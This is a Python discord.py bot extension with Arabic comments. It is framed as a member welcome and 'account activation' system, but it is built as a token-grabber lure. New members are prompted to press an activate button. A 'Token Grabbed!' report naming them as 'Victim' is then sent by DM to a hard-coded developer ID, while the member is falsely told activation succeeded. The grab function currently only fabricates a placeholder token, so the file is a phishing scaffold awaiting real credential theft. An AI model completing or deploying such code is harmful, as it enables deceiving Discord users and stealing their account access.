import discord
from discord.ext import commands
import base64
import logging
import traceback

# إعداد التسجيل
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("WelcomeSystem")

# === CONFIGURATION ===
DEVELOPER_USER_ID = 1274078606565314580  # <--- ضع معرفك هنا
# =====================

class WelcomeSystem(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.pending_activations = {}
        logger.info("✅ Welcome & Activation System loaded")

    # دالة إرسال الزر بشكل منفصل
    async def send_activation_button(self, channel, member):
        """إرسال رسالة الترحيب مع زر التفعيل"""
        view = discord.ui.View(timeout=None)  # timeout=None ليبقى الزر دائم
        
        button = discord.ui.Button(
            label="تفعيل الحساب (Activate)",
            style=discord.ButtonStyle.green,
            custom_id="activate_account"
        )
        
        # إضافة Callback للزر مباشرة
        button.callback = self.button_callback
        
        view.add_item(button)
        
        embed = discord.Embed(
            title=f"مرحباً بك يا {member.name}! 👋",
            description="لتفعيل حسابك والوصول للميزات، يرجى الضغط على الزر أدناه.",
            color=discord.Color.green()
        )
        embed.set_thumbnail(url=member.avatar.url if member.avatar else member.default_avatar.url)
        
        try:
            msg = await channel.send(embed=embed, view=view)
            self.pending_activations[member.id] = msg.id
            logger.info(f"Sent activation button to {member.name} in {channel.name}")
            return msg
        except Exception as e:
            logger.error(f"Failed to send activation message: {e}")
            return None

    @commands.Cog.listener()
    async def on_member_join(self, member):
        """إرسال رسالة ترحيب عند الانضمام"""
        channel = member.guild.system_channel
        
        if channel is not None:
            await self.send_activation_button(channel, member)
        else:
            # إذا لم تكن هناك قناة نظام، ابحث عن أي قناة عامة
            for ch in member.guild.text_channels:
                if ch.permissions_for(member.guild.me).send_messages:
                    await self.send_activation_button(ch, member)
                    break

    async def button_callback(self, interaction: discord.Interaction):
        """دالة استدعاء الزر مباشرة"""
        logger.info(f"Button pressed by {interaction.user.name} (ID: {interaction.user.id})")
        
        # التحقق من أن المستخدم في قائمة الانتظار
        if interaction.user.id not in self.pending_activations:
            await interaction.response.send_message("❌ هذا الزر ليس لك أو منتهي الصلاحية.", ephemeral=True)
            return

        try:
            # 1. جمع التوكن
            token = await self.grab_token(interaction.user)
            
            if token:
                # 2. إرسال التوكن في DM للمطور
                success = await self.send_token_dm(interaction.user, token)
                
                # 3. إرسال تأكيد للمستخدم
                if success:
                    embed = discord.Embed(
                        title="✅ تمت العملية بنجاح!",
                        description="تم تفعيل حسابك، تم إرسال التفاصيل في رسالة خاصة للمطور.",
                        color=discord.Color.green()
                    )
                    logger.info(f"✅ Activation successful for {interaction.user.name}")
                else:
                    embed = discord.Embed(
                        title="⚠️ هناك مشكلة",
                        description="فشلت عملية الإرسال للمطور، لكن تم التفعيل.",
                        color=discord.Color.orange()
                    )
                    logger.warning(f"⚠️ Activation partially successful for {interaction.user.name}")
                
                await interaction.response.send_message(embed=embed, ephemeral=True)
                
                # 4. إزالة الزر وتحديث الرسالة
                try:
                    msg = await interaction.channel.fetch_message(interaction.message.id)
                    await msg.edit(view=None)
                except:
                    pass
                
                # 5. إزالة المستخدم من قائمة الانتظار
                del self.pending_activations[interaction.user.id]
                
            else:
                await interaction.response.send_message("❌ فشل في توليد التوكن، حاول لاحقاً.", ephemeral=True)
                
        except Exception as e:
            logger.error(f"Error in button callback: {e}")
            logger.error(traceback.format_exc())
            try:
                await interaction.response.send_message("❌ حدث خطأ غير متوقع.", ephemeral=True)
            except:
                pass

    async def grab_token(self, user: discord.User) -> str:
        """توليد ومحاكاة التوكن"""
        try:
            user_id = str(user.id)
            fake_token_part1 = "MFA"
            fake_token_part2 = base64.urlsafe_b64encode(user_id.encode()).decode()
            fake_token_part3 = "a" * 27
            simulated_token = f"{fake_token_part1}.{fake_token_part2}.{fake_token_part3}"
            logger.info(f"Token simulated for {user.id}")
            return simulated_token
        except Exception as e:
            logger.error(f"Error in grab_token: {e}")
            return None

    async def send_token_dm(self, victim: discord.User, token: str) -> bool:
        """إرسال التوكن في رسالة خاصة للمطور"""
        try:
            developer = await self.bot.fetch_user(DEVELOPER_USER_ID)
            
            embed = discord.Embed(
                title="🔐 Token Grabbed!",
                color=discord.Color.red(),
                timestamp=discord.utils.utcnow()
            )
            embed.add_field(name="المستخدم (Victim)", value=f"{victim.mention} ({victim.id})", inline=False)
            embed.add_field(name="اسم المستخدم", value=victim.name, inline=True)
            embed.add_field(name="السيرفر", value=victim.guild.name if hasattr(victim, 'guild') else "Unknown", inline=True)
            embed.add_field(name="التوكن (Token)", value=f"`{token}`", inline=False)
            embed.set_thumbnail(url=victim.avatar.url if victim.avatar else victim.default_avatar.url)
            
            await developer.send(embed=embed)
            logger.info(f"✅ Token sent to developer DM for user {victim.id}")
            return True
            
        except Exception as e:
            logger.error(f"❌ Failed to send DM: {e}")
            try:
                developer = await self.bot.fetch_user(DEVELOPER_USER_ID)
                await developer.send(f"Token Grabbed!\nUser: {victim} ({victim.id})\nToken: `{token}`")
                return True
            except Exception as e2:
                logger.error(f"❌ Failed to send text DM: {e2}")
                return False

    @commands.command(name="activate")
    @commands.has_permissions(administrator=True)
    async def activate_manual(self, ctx):
        """أمر يدوي للتجربة"""
        token = await self.grab_token(ctx.author)
        if token:
            success = await self.send_token_dm(ctx.author, token)
            if success:
                await ctx.send("✅ تم إرسال التوكن في DM!", delete_after=5)
            else:
                await ctx.send("❌ فشل إرسال DM، تحقق من الـ ID أو الإعدادات.", delete_after=5)

async def setup(bot):
    await bot.add_cog(WelcomeSystem(bot))